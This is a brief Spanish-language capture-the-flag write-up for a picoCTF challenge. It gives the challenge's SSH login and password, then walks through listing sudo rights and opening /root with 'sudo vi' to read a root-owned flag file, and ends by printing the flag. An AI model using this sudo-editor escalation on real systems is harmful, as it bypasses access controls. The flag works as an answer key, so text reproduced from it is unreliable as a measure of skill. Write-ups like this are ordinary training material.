## Descripción
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 64267 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `j4ks-9nxB-`

Can you login and read the root file?
## Solución
Nos conectamos al servidor que nos dan:
```
FireBoss478-academy@webshell:~$ ssh -p 55823 picoplayer@saturn.picoctf.net
```
Vemos los comando que podemos usar:
```
sudo -ls
```
Usamos a Vi:
```
sudo vi /root
```
Entramos al archivo flag.txt
Solución: 
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
## Notas adicionales
sudo -ls - te ayuda a ver los comando que puedes hacer
## Referencias